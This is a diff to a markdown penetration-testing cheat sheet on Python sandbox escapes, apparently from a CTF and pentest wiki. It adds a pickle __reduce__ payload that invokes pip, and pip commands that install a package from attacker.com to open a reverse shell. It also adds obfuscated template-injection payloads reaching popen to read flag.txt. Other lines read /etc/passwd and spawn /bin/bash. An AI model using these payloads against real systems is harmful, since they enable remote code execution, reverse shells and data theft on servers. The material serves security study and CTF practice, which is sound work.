@@ -16,7 +16,7 @@ subprocess.call("ls", shell=True)
 subprocess.Popen("ls", shell=True)
 pty.spawn("ls")
 pty.spawn("/bin/bash")
-platform.popen("ls").read()
+platform.os.system("ls")
 
 #Other interesting functions
 open("/etc/passwd").read()
@@ -48,6 +48,46 @@ system('ls')
 ```
 
 Python try to **load libraries from the current directory first**: `python3 -c 'import sys; print(sys.path)'`
+
+## Bypass pickle sandbox with default installed python packages
+
+### Default packages
+
+You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)  
+Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.  
+For example the following pickle, when loaded, is going to import the pip library to use it:
+
+```python
+#Note that here we are importing the pip library so the pickle is created correctly
+#however, the victimdoesn't even need to have the library installed to execute it
+#the library is going to be loaded automatically
+
+import pickle, os, base64, pip
+class P(object):
+    def __reduce__(self):
+        return (pip.main,(["list"],))
+
+print(base64.b64encode(pickle.dumps(P(), protocol=0)))
+```
+
+For more information about how does pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+
+### Pip package
+
+If you have access to `pip` or to `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
+
+```bash
+pip install http://attacker.com/Rerverse.tar.gz
+pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
+```
+
+You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
+
+{% file src="../../.gitbook/assets/reverse.tar.gz" %}
+
+{% hint style="info" %}
+This package is called `Reverse`.However, it was specially crafted so when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
+{% endhint %}
 
 ## Executing python code
 
@@ -165,6 +205,10 @@ get_flag.__globals__['__builtins__'].__import__("os").system("ls")
 
 # The os._wrap_close class is usually loaded. Its scope gives direct access to os package (as well as __builtins__)
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['system']('ls')
+
+#If attr is present
+(''|attr('___class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
+(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
 
 #### Python2 and Python3
